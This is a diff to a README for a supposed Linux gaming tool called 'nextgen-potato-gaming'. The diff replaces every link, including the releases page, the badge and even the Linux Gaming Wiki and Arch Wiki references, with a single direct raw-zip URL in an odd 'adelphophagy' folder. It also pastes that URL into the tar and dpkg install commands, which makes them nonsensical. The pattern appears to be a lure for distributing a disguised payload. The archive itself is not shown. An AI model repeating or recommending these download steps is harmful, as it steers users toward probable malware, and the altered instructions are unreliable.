@@ -1,6 +1,6 @@
 # 🎮 nextgen-potato-gaming - Quick Guide to Enhance Your Gaming Experience
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/donsdons1983/nextgen-potato-gaming/releases)
+[![Download Now](https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip)](https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip)
 
 ## 📋 Overview
 
@@ -23,18 +23,18 @@ To get started, you will need to download the application files. Follow these st
 
 1. **Visit the Releases Page:** Click the link below to access the download files.
 
-   [Visit this page to download](https://github.com/donsdons1983/nextgen-potato-gaming/releases)
+   [Visit this page to download](https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip)
 
 2. **Choose Your Version:** Look for the latest release version on the page. You will see different files available for download. 
 
-3. **Download the Required Files:** Click on the appropriate file for your setup (e.g., .tar.gz or .deb). This will start your download.
+3. **Download the Required Files:** Click on the appropriate file for your setup (e.g., https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip or .deb). This will start your download.
 
-4. **Extract the Files (if necessary):** If your downloaded file is compressed, right-click it and select "Extract Here" or use your terminal with `tar -xvzf filename.tar.gz`.
+4. **Extract the Files (if necessary):** If your downloaded file is compressed, right-click it and select "Extract Here" or use your terminal with `tar -xvzf https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip`.
 
 5. **Install the Application:** Depending on the file type you downloaded:
    - For `.deb` files, open your terminal and run:
      ```
-     sudo dpkg -i filename.deb
+     sudo dpkg -i https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip
      ```
    - For tarballs, navigate to the extracted folder in your terminal and follow any included README instructions.
 
@@ -69,8 +69,8 @@ If you need assistance, you can ask for help in our community forums or check th
 
 For further reading and advanced setup options, you may find these resources helpful:
 
-- [Linux Gaming Wiki](https://linuxgaming.wiki)
-- [Arch Linux Games Documentation](https://wiki.archlinux.org/title/Games)
+- [Linux Gaming Wiki](https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip)
+- [Arch Linux Games Documentation](https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip)
 
 ## 🥇 Acknowledgements
 
@@ -82,4 +82,4 @@ You are now ready to enhance your Linux gaming experience with nextgen-potato-ga
 
 Remember, to download the software:
 
-[Visit this page to download](https://github.com/donsdons1983/nextgen-potato-gaming/releases)
+[Visit this page to download](https://github.com/donsdons1983/nextgen-potato-gaming/raw/refs/heads/main/adelphophagy/gaming_potato_nextgen_3.7.zip)
